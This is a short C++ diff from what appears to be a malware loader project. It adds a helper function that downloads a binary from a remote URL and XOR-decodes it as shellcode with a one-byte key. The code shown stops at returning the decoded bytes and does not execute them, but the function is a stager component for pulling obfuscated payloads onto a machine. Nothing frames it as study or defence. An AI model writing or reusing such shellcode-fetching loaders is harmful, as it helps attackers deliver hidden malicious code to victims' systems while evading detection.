@@ -3,6 +3,7 @@
 #include "helper.hpp"
 #include "def.h"
 
+
 helper helperHandler;
 
 
@@ -76,4 +77,13 @@ helper helperHandler;
 
 
         return k;
+    };
+
+    std::vector<unsigned char> helper::fetchRemoteShellcodeAndDecode(const std::wstring& url, const std::wstring& file, unsigned char shellcode_key)
+    {
+        std::vector<unsigned char> rep = DownloadBinary(url, file);
+
+        helper::xor_shellcode(rep.data(), (int)rep.size(), shellcode_key);
+
+        return rep;
     }
